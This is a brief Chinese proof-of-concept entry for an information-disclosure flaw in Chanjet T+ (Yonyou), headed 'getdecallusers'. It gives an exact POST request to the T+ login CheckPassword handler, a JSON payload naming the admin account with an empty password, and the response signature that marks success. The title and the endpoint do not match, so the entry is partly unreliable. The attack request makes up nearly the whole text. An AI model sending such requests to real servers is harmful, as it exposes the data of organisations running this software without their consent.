# 畅捷通getdecallusers信息泄露漏洞

用友 ｜ 信息泄露 ｜ —
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1`

**Payload**
```
{"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023", "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid": "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "", "fromWhere": "browser", "cardNo": ""}
```
- **响应特征**：200 error